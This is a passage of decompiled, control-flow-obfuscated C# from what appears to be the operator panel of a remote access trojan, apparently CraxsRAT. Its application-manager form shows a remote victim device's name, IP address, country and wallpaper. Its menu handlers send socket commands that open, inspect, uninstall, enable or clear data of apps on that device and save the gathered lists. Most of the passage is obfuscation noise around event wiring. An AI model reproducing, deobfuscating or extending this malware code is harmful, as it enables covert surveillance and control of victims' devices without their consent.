          switch ((num2 = (uint) ~((~num1 - (~(~-653268523 ^ 474253208) - (946103241 + 1162231602 + ~-2061392183 - (--1438601919 + (-463999180 - 44770135))))) * -1570258387 * -36287179 * 1150616269)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1690790462 ^ 1971718950;
              continue;
            case 1:
              this._SaveToolStripMenuItem = value;
              toolStripMenuItem = this._SaveToolStripMenuItem;
              num1 = 1238515757;
              continue;
            case 2:
              int num3 = toolStripMenuItem == null ? -2056427173 : (num3 = 1565070081);
              num1 = num3 ^ (int) num2 * -530435349;
              continue;
            case 3:
              toolStripMenuItem = this._SaveToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1744276400 : (num4 = -1473911086);
              num1 = num4 ^ (int) num2 * -2089192202;
              continue;
            case 4:
              goto label_1;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1986299745 ^ 2109265826;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => this._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._SaveAsToolStripMenuItem;
label_1:
        int num1 = -1551874213;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~-num1) % 8U)
          {
            case 0:
              this._SaveAsToolStripMenuItem = value;
              num1 = -1458808465;
              continue;
            case 1:
              toolStripMenuItem = this._SaveAsToolStripMenuItem;
              num1 = (int) num2 * -1786594225 ^ 702477995;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              int num3 = toolStripMenuItem == null ? 675842934 : (num3 = 1278557041);
              num1 = num3 ^ (int) num2 * 1195705316;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? -1026710004 : (num4 = -1704545042);
              num1 = num4 ^ (int) num2 * 1620541132;
              continue;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 678329645 ^ 1823869990;
              continue;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -885526718 ^ -466606216;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => this._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        System.Windows.Forms.Timer topacity = this._TOpacity;
label_1:
        int num1 = -1471303743;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~~((-844060847 - 1239353770 ^ -2123593081 * 1008196225) - (301774314 - 1610026872 ^ ~-42717921) - ~(-1776750739 * (465703791 + -772361805 * 577992707) - num2)) * 441678933)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = topacity == null ? 1069702566 : (num4 = 1570529131);
              num1 = num4 ^ (int) num3 * -1630771840;
              continue;
            case 2:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * 1930099979 ^ 1759927398;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num5 = topacity == null ? -838645369 : (num5 = -1846098224);
              num1 = num5 ^ (int) num3 * -64159303;
              continue;
            case 5:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * 1479951685 ^ 959394762;
              continue;
            case 6:
              this._TOpacity = value;
              topacity = this._TOpacity;
              num1 = 611605053;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("PB")]
    internal virtual ProgressBar PB { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox BoxTitle
    {
      get => this._BoxTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.BoxTitle_Paint);
        EventHandler eventHandler = new EventHandler(this.BoxTitle_Resize);
label_1:
        int num1 = -37570883;
        PictureBox boxTitle;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(-num1 + (~(-1350537522 * 1327469481 ^ -133744800 - 210699293) + (---454722080 ^ -520515726 ^ ~-845615878))) * -1591149765 - -1851782102)) % 9U)
          {
            case 0:
              int num3 = boxTitle == null ? 732537482 : (num3 = -1987235439);
              num1 = num3 ^ (int) num2 * -1462365890;
              continue;
            case 1:
              int num4 = boxTitle == null ? 1713013551 : (num4 = -1632102648);
              num1 = num4 ^ (int) num2 * 1880007379;
              continue;
            case 2:
              goto label_1;
            case 3:
              boxTitle.Paint -= paintEventHandler;
              boxTitle.Resize -= eventHandler;
              num1 = (int) num2 * -435339217 ^ -1144384617;
              continue;
            case 4:
              boxTitle.Paint += paintEventHandler;
              num1 = (int) num2 * 624255832 ^ -1164933489;
              continue;
            case 5:
              this._BoxTitle = value;
              boxTitle = this._BoxTitle;
              num1 = 1143412156;
              continue;
            case 6:
              boxTitle.Resize += eventHandler;
              num1 = (int) num2 * 2051971102 ^ -382828449;
              continue;
            case 7:
              boxTitle = this._BoxTitle;
              num1 = (int) num2 * -1996489646 ^ -31292;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem PropertiesToolStripMenuItem
    {
      get => ((Applications._Closure\u0024__) this)._PropertiesToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PropertiesToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((Applications._Closure\u0024__) this)._PropertiesToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_5;
label_1:
        int num1 = 1364120293;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(~num1 * 1313680741) ^ -2056426334 ^ 969655994)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1435635497 ^ -1963262392;
              continue;
            case 2:
              toolStripMenuItem = ((Applications._Closure\u0024__) this)._PropertiesToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 1340825156 : (num3 = 717330139);
              num1 = num3 ^ (int) num2 * -1537087183;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -560901140 ^ 1593941870;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_5;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((Applications._Closure\u0024__) this)._PropertiesToolStripMenuItem = value;
        num1 = -416397972;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      get => ((Applications._Closure\u0024__) this)._RefreshToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
label_1:
        int num1 = -540162265;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-~(num1 - (-(932199489 + ~249888968 ^ ~-933405741) ^ 1147958788 - 1222570329 + ~587549882 - 1175441510 + (~(2040052620 ^ -1952856649) - -2132452879 * -1862725629))) - 79954890 - (287629860 - 690567416)) * 786777093)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = ((Applications._Closure\u0024__) this)._RefreshToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 234277414 : (num3 = 540162225);
              num1 = num3 ^ (int) num2 * -272502667;
              continue;
            case 2:
              goto label_3;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -841499606 ^ -1231556134;
              continue;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 609643204 ^ -1732174739;
              continue;
            case 5:
              ((Applications._Closure\u0024__) this)._RefreshToolStripMenuItem = value;
              num1 = 929732317;
              continue;
            case 6:
              toolStripMenuItem = ((Applications._Closure\u0024__) this)._RefreshToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1822773313 : (num4 = -1308189304);
              num1 = num4 ^ (int) num2 * 1573089903;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((Applications._Closure\u0024__) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Applications._Closure\u0024__) this)._Column1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((AppsProperties) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AppsProperties) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column9
    {
      get => ((AppsProperties) this)._Column9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AppsProperties) this)._Column9 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column2
    {
      get => ((AppsProperties) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AppsProperties) this)._Column2 = value;
    }

    internal virtual DataGridViewImageColumn Column3
    {
      get => ((AppsProperties) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AppsProperties) this)._Column3 = value;
    }

    internal virtual ToolStripMenuItem UninstallToolStripMenuItem
    {
      get => ((AppsProperties) this)._UninstallToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UninstallToolStripMenuItem_Click);
label_1:
        int num1 = -245910129;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (1796816022 - -~(num2 * 568089833 ^ -95734043 * 1465599593 ^ 814394695 * (--1597640286 ^ 244415488 + 2048371381)))) % 8U)
          {
            case 0:
              ((AppsProperties) this)._UninstallToolStripMenuItem = value;
              num1 = 1725440374;
              continue;
            case 1:
              int num4 = toolStripMenuItem == null ? 1943166386 : (num4 = -1106139917);
              num1 = num4 ^ (int) num3 * 274801387;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1814859168 ^ 1449741509;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1273454173 ^ -1672940322;
              continue;
            case 6:
              toolStripMenuItem = ((AppsProperties) this)._UninstallToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? -341442341 : (num5 = -2003590060);
              num1 = num5 ^ (int) num3 * -1923098631;
              continue;
            case 7:
              toolStripMenuItem = ((AppsProperties) this)._UninstallToolStripMenuItem;
              num1 = (int) num3 * 919581485 ^ 1621038975;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem ClearAppDataToolStripMenuItem
    {
      get => ((AppsProperties) this)._ClearAppDataToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ClearAppDataToolStripMenuItem_Click);
label_1:
        int num1 = 1980609636;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (~1738936525 + (-326347484 - -1417853864) - (num2 - -~~~(-1486717104 - 1469111483) ^ ~(-341808609 * -1185322755 ^ ~-2128917465 ^ 568491264 - 2036605179 * -1788775039) ^ ~(1602138836 - 1883424264 - (-1861169281 - 1359913531))) - (385725419 ^ 874379555) - 902997235)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1580674663 ^ 917110370;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1957612923 ^ 1118864942;
              continue;
            case 3:
              toolStripMenuItem = ((AppsProperties) this)._ClearAppDataToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1911421845 : (num4 = -1953553108);
              num1 = num4 ^ (int) num3 * -147562858;
              continue;
            case 4:
              toolStripMenuItem = ((AppsProperties) this)._ClearAppDataToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 2090384547 : (num5 = -1703165906);
              num1 = num5 ^ (int) num3 * 197455426;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((AppsProperties) this)._ClearAppDataToolStripMenuItem = value;
              num1 = 1698047872;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem EnableToolStripMenuItem
    {
      get => ((AppsProperties) this)._EnableToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnableToolStripMenuItem_Click);
label_1:
        int num1 = -958698935;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~((num1 ^ (-~994210781 - (2082506192 ^ --1051999116)) * 277446585 - ((-108214378 * -1596155229 + ~-806182771 ^ (-1825584321 ^ -1403206905) - -1061439839 * 353075975) - -175069957)) - ~~~~334897189 - (-(1873700027 - 1644786232) ^ 2029203237 * -1571629269 ^ ~-311870121) - ~(-1593444150 ^ 1809263069))) % 8U)
          {
            case 0:
              ((AppsProperties) this)._EnableToolStripMenuItem = value;
              toolStripMenuItem = ((AppsProperties) this)._EnableToolStripMenuItem;
              num1 = 103445378;
              continue;
            case 1:
              int num3 = toolStripMenuItem == null ? -1604960040 : (num3 = 868313594);
              num1 = num3 ^ (int) num2 * -1998440089;
              continue;
            case 2:
              toolStripMenuItem = ((AppsProperties) this)._EnableToolStripMenuItem;
              num1 = (int) num2 * -952068712 ^ -834400768;
              continue;
            case 3:
              int num4 = toolStripMenuItem == null ? -39439418 : (num4 = -342665871);
              num1 = num4 ^ (int) num2 * -1058890961;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 897119646 ^ -1086599019;
              continue;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -31452824 ^ -497614601;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((AppsProperties) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AppsProperties) this)._Panel2 = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((AppsProperties) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((AppsProperties) this)._clinameinfo = value;
      }
    }

    internal virtual PictureBox ClientPic
    {
      get => ((Build) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._ClientPic = value;
    }

    public void CraxsStyle()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1932188841;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(num1 - (-1558767035 * -336096102 - ~(-1964321395 ^ 352971200 + 451668427) ^ -((1348648393 ^ 802536242) + -1943719858) * 1315883141)) * -1390372821 ^ ~-653112819 + (-10589060 ^ -1383555271)) + (823983200 - -1383790423) - -1452992689)) % 16U)
        {
          case 0:
            this.ctx.Items[6].Text = EXGuarder.\u0033A6E0007;
            this.ctx.Items[7].Text = EXGuarder.\u00301445664;
            num1 = (int) num2 * 720906010 ^ 1072519902;
            continue;
          case 1:
            this.ctx.Items[0].Text = EXGuarder.\u0034240794E;
            num1 = (int) num2 * 2124468957 ^ 1519582942;
            continue;
          case 2:
            this.ctx.Items[1].Text = EXGuarder.\u003663C6769;
            this.ctx.Items[2].Text = EXGuarder.\u00339673750;
            num1 = (int) num2 * 1438971657 ^ 1092096710;
            continue;
          case 3:
            this.ctx.Items[2].Text = EXGuarder.\u003193F1009;
            num1 = (int) num2 * -1006798371 ^ -566189779;
            continue;
          case 4:
            int num3 = Operators.CompareString(language, EXGuarder.\u0031B573764, false) == 0 ? -1699222845 : (num3 = -1075655299);
            num1 = num3 ^ (int) num2 * 1959079563;
            continue;
          case 5:
            this.ctx.Items[1].Text = EXGuarder.\u00337146B1F;
            num1 = (int) num2 * -1492773119 ^ -1824537565;
            continue;
          case 6:
            this.ctx.Items[0].Text = EXGuarder.\u00316154964;
            num1 = 1523116588;
            continue;
          case 7:
            this.ctx.Items[4].Text = EXGuarder.\u00334730707;
            this.ctx.Items[5].Text = EXGuarder.\u0034E370814;
            this.ctx.Items[6].Text = EXGuarder.\u0031005790E;
            num1 = (int) num2 * -1331476514 ^ 515136005;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * -902519670 ^ -1535174556;
            continue;
          case 10:
            this.ctx.Items[5].Text = EXGuarder.\u003496D055A;
            num1 = (int) num2 * -1750125895 ^ -1947311193;
            continue;
          case 11:
            goto label_3;
          case 12:
            int num4 = Operators.CompareString(language, EXGuarder.\u0032E792448, false) != 0 ? 494780086 : (num4 = 1749050520);
            num1 = num4 ^ (int) num2 * -809456426;
            continue;
          case 13:
            this.ctx.Items[3].Text = EXGuarder.\u00308294003;
            num1 = (int) num2 * -1960783452 ^ 1929721494;
            continue;
          case 14:
            this.ctx.Items[7].Text = EXGuarder.\u0034E2B2A15;
            num1 = (int) num2 * 260775240 ^ 1637669960;
            continue;
          case 15:
            this.ctx.Items[3].Text = EXGuarder.\u00346785774;
            this.ctx.Items[4].Text = EXGuarder.\u00376121900;
            num1 = (int) num2 * -326179337 ^ 529427314;
            continue;
          default:
            goto label_18;
        }
      }
label_3:
      return;
label_18:;
    }

    private void SpyStyle()
    {
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -1109201641;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1600481013 * 2033013708 - ((num2 - (~895051725 * -1170885983 - -1978565277 ^ ---1640806111 - -~(1767456731 * 456387387)) - ~(-(2130755134 - -1464857793) ^ (1565855062 ^ -492457619) - -2040855458)) * -362583119 ^ (-2116880710 - -1441611565) * 345817803) ^ 26742055)) % 5U)
        {
          case 0:
            num1 = (int) num3 * 970543393 ^ 2091816194;
            continue;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num3 * -37720680 ^ 1996316974;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            goto label_5;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 561268291;
      goto label_2;
    }

    private void Applications_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u003182F5F4B);
      this.CraxsStyle();
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((Build) this).classClient).Wallpaper;
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        this.clinameinfo.Text = EXGuarder.\u0030A162637 + ((Data._Closure\u0024__39\u002D12) ((Build) this).classClient).ClientName + Strings.Space(2) + EXGuarder.\u00338480302 + ((Data) ((Build) this).classClient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u00350723C69 + ((Data._Closure\u0024__39\u002D11) ((Build) this).classClient).Country;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
      this.DGV0.DefaultCellStyle.Font = Settings.f;
label_4:
      int num1 = 238589459;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~((num1 ^ -(~(-834253674 - -30397990 ^ -2026757822 * 513479453) ^ (-1678697639 * -1403894575 ^ 470941901 - 636440341) * 1504347325) ^ ~--749370154) - -(1812777059 * -1209764255) * 1893314341) + (2018708134 - 1364789346)) * -321330087)) % 7U)
        {
          case 0:
            goto label_4;
          case 2:
            this.SaveToolStripMenuItem.Visible = true;
            this.SaveAsToolStripMenuItem.Visible = true;
            num1 = (int) num2 * 1893319977 ^ -598228360;
            continue;
          case 3:
            this.Text = ((Build) this).Title;
            num1 = -1909913613;
            continue;
          case 4:
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = (int) num2 * 1815560615 ^ -1380024373;
            continue;
          case 5:
            int num3 = Operators.CompareString(getIconFrmReg.SHFILEINFOW.SAVING_DATA, EXGuarder.\u003323D3251, false) != 0 ? 1121045237 : (num3 = -422336778);
            num1 = num3 ^ (int) num2 * -1683772665;
            continue;
          case 6:
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -413057528 ^ 1198139149;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      ((Build) this).BoxTitlePaintEventArgsWait = true;
    }

    private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -968205802;
      int index;
      string str;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((~~num1 ^ -(-722605582 * 1884942075)) + 1604601679) * 1683464223)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = index >= 0 ? 1758601817 : (num3 = -1088032755);
            continue;
          case 1:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * -1172429423 ^ 290103511;
            continue;
          case 2:
            goto label_12;
          case 3:
            ((Build) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -447537003 ^ -432389141;
            continue;
          case 4:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = -82295680;
            continue;
          case 5:
            int num4 = ((Build) this).classClient == null ? 706023125 : (num4 = -1102551548);
            num1 = num4 ^ (int) num2 * -1306065445;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Build) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00315364B47 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00341600231 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031937384B + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036B765D26),
              (object) ((Build) this).classClient
            };
            num1 = (int) num2 * 46002525 ^ -420088132;
            continue;
          case 7:
            num1 = (int) num2 * -1139877322 ^ -137374781;
            continue;
          case 8:
            goto label_1;
          case 9:
            checked { index += -1; }
            num1 = 1463972397;
            continue;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -972745780;
      int index;
      string str;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((num1 ^ ~(((1525655062 ^ -1286429026 - -869641781) - 1212799739) * -1275853639)) - (-(1885817948 - 1370607129 ^ -1289355691) + ~(983826297 - 734238221 ^ -297659171)) ^ (693363535 + 507852306 + ~-249080537) * -1486351589) * -1382871137)) % 10U)
        {
          case 0:
            checked { index += -1; }
            num1 = 638653430;
            continue;
          case 1:
            num1 = (int) num2 * 815775119 ^ 1376219113;
            continue;
          case 2:
            goto label_12;
          case 3:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = 1263404601;
            continue;
          case 4:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * 300233680 ^ -1976939711;
            continue;
          case 5:
            ((Build) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -1664878419 ^ -661630919;
            continue;
          case 6:
            int num3;
            num1 = num3 = index >= 0 ? 289753639 : (num3 = -1830956296);
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Build) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00337787568 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003533F430A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.AppsProperties + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00302152567 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0034847790B),
              (object) ((Build) this).classClient
            };
            num1 = (int) num2 * -1507755317 ^ 318585844;
            continue;
          case 8:
            goto label_1;
          case 9:
            int num4 = ((Build) this).classClient == null ? -1065803817 : (num4 = -118405428);
            num1 = num4 ^ (int) num2 * 793302789;
            continue;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
label_1:
      int num1 = 1915377164;
      while (true)
      {
        uint num2;
        WaitCallback callBack;
        switch ((num2 = (uint) (---(num1 * 1117728681 + ~~-1818358987) ^ -1753959335)) % 7U)
        {
          case 0:
            goto label_3;
          case 1:
            callBack = Build.\u0024IR102\u002D1;
            break;
          case 2:
            int num3 = saveFileDialog.ShowDialog() != DialogResult.OK ? -2002331580 : (num3 = 37975410);
            num1 = num3 ^ (int) num2 * -876834314;
            continue;
          case 3:
            if (Build.\u0024IR102\u002D1 == null)
            {
              // ISSUE: reference to a compiler-generated method
              callBack = Build.\u0024IR102\u002D1 = new WaitCallback(Build.\u0024I._Lambda\u0024__R102\u002D1);
              break;
            }
            num1 = (int) num2 * -1440467623 ^ -1371217932;
            continue;
          case 4:
            saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u003232F3C2A) + EXGuarder.\u00338472C5E;
            saveFileDialog.Filter = EXGuarder.\u00361252565;
            num1 = (int) num2 * 230720804 ^ -183512638;
            continue;
          case 5:
            saveFileDialog.Dispose();
            num1 = 977419848;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_12;
        }
        object[] state = new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u0035E070552,
          (object) saveFileDialog.FileName,
          (object) ((Build) this).tmpClientName,
          (object) (((Build) this).tmpCountry + EXGuarder.\u00374575029 + ((Build) this).tmpAddressIP),
          (object) EXGuarder.\u0033D672541,
          (object) EXGuarder.\u0031E493D1E,
          (object) EXGuarder.\u0035E070552
        };
        ThreadPool.QueueUserWorkItem(callBack, (object) state);
        num1 = -1367831020;
      }
label_3:
      return;
label_12:;
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      reso.Directory_Exist(((Build) this).classClient);
label_1:
      int num1 = 660562900;
      while (true)
      {
        int num2 = num1;
        uint num3;
        WaitCallback callBack;
        switch ((num3 = (uint) (-((1880534859 * -617440254 ^ -234099438 ^ -2084647260) - -(-num2 - ~(-37399683 ^ -483930673 - 1159261934 ^ -(1357627014 ^ -83481130)))) * 2114493127)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            if (Build.\u0024IR103\u002D2 != null)
            {
              num1 = (int) num3 * -402869680 ^ 1381672175;
              continue;
            }
            // ISSUE: reference to a compiler-generated method
            Build.\u0024IR103\u002D2 = callBack = new WaitCallback(Build.\u0024I._Lambda\u0024__R103\u002D2);
            break;
          case 2:
            callBack = Build.\u0024IR103\u002D2;
            break;
          case 3:
            goto label_1;
          default:
            goto label_9;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) this.DGV0,
          (object) ((Build) this).tmpFolderUSER,
          (object) EXGuarder.\u00307630669,
          (object) ((Build) this).tmpClientName,
          (object) (((Build) this).tmpCountry + EXGuarder.\u0035F1C4907 + ((Build) this).tmpAddressIP),
          (object) EXGuarder.\u00307630669,
          (object) EXGuarder.\u0030131504D,
          (object) (DateAndTime.Now.ToString(EXGuarder.\u003250E0807) + EXGuarder.\u00346535607)
        });
        num1 = 302685601;
      }
label_3:
      return;
label_9:;
    }

    private void BoxTitle_Paint(object sender, PaintEventArgs e)
    {
      if (!((Build) this).BoxTitlePaintEventArgsWait)
        return;
label_1:
      int num1 = -761057778;
      while (true)
      {
        int num2 = num1;
        uint num3;
        Size size;
        string str1;
        string str2;
        Rectangle rect;
        Color defaultColorForeground;
        Brush brush1;
        Brush brush2;
        int count;
        switch ((num3 = (uint) ((-1794057809 - 703121985) * -193483845 + -(1529036111 * -193098495) - -~num2)) % 12U)
        {
          case 0:
            e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
            num1 = (int) num3 * -511051284 ^ -703338650;
            continue;
          case 1:
            str1 = EXGuarder.\u00317074628 + Conversions.ToString(count);
            num1 = (int) num3 * -789358130 ^ 1738793129;
            continue;
          case 2:
            brush1 = (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground);
            int r = (int) this.BoxTitle.BackColor.R;
            Color backColor = this.BoxTitle.BackColor;
            int g = (int) backColor.G;
            backColor = this.BoxTitle.BackColor;
